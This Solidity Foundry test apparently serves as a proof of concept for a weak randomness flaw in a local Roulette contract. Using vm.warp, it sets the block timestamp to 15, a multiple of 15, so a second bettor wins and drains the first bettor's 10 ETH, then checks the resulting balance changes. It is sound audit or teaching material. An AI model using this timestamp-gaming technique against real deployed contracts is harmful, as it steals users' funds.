// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract RouletteTest is Test {
    Roulette public roulette;
    address public userA;
    address public userB;

    function setUp() public {
        roulette = new Roulette();
        userA = makeAddr("userA");
        userB = makeAddr("userB");
    }

    function test_WeakPRNG() public {
        // Fund users
        vm.deal(userA, 10 ether);
        vm.deal(userB, 10 ether);
        
        // UserA places losing bet at timestamp=14 (14 % 15 != 0)
        vm.prank(userA);
        vm.warp(14);
        roulette.placeBet{value: 10 ether}();
        
        // Contract holds 10 ETH after losing bet
        assertEq(address(roulette).balance, 10 ether);
        assertEq(userA.balance, 0);

        console2.log("--- BEFORE-Trigger (userB's winning bet) ---");
        // Capture pre-attack state
        uint256 preContractBalance = address(roulette).balance;
        uint256 preUserBbalance = userB.balance;
        uint256 preTotalWinners = roulette.totalWinners();
        uint256 preUserBWins = roulette.playerWins(userB);
        
        console2.log("Contract balance (pre): %s ETH", preContractBalance);
        console2.log("UserB balance (pre): %s ETH", preUserBbalance);
        console2.log("Total winners (pre): %s", preTotalWinners);
        console2.log("UserB wins (pre): %s", preUserBWins);

        console2.log("--- Trigger: userB places winning bet at timestamp=15 ---");
        // UserB places winning bet
        vm.prank(userB);
        vm.warp(15);
        roulette.placeBet{value: 10 ether}();
        
        console2.log("--- AFTER-Trigger (userB's winning bet) ---");
        // Capture post-attack state
        uint256 postContractBalance = address(roulette).balance;
        uint256 postUserBbalance = userB.balance;
        uint256 postTotalWinners = roulette.totalWinners();
        uint256 postUserBWins = roulette.playerWins(userB);
        
        console2.log("Contract balance (post): %s ETH", postContractBalance);
        console2.log("UserB balance (post): %s ETH", postUserBbalance);
        console2.log("Total winners (post): %s", postTotalWinners);
        console2.log("UserB wins (post): %s", postUserBWins);

        // Calculate state changes
        bool contractBalanceChanged = (preContractBalance == 10 ether) && (postContractBalance == 0);
        bool userBBalanceChanged = (postUserBbalance - preUserBbalance == 10 ether);
        bool totalWinnersChanged = (postTotalWinners - preTotalWinners == 1);
        bool userWWinsChanged = (postUserBWins - preUserBWins == 1);

        console2.log("\n--- Differential Result ---");
        console2.log("Contract balance decreased 10 ETH? %s", contractBalanceChanged ? "YES" : "NO");
        console2.log("UserB net profit 10 ETH? %s", userBBalanceChanged ? "YES" : "NO");
        console2.log("New winner added? %s", totalWinnersChanged ? "YES" : "NO");
        console2.log("UserB wins increased? %s", userWWinsChanged ? "YES" : "NO");

        // Final Vulnerability Determination
        bool vulnerabilityExists = contractBalanceChanged && 
                                   userBBalanceChanged && 
                                   totalWinnersChanged && 
                                   userWWinsChanged;

        require(vulnerabilityExists, "State changes indicate exploit was not successful");
        console2.log("\nVulnerability Exists: All state changes confirm the weak PRNG was exploited");
    }
}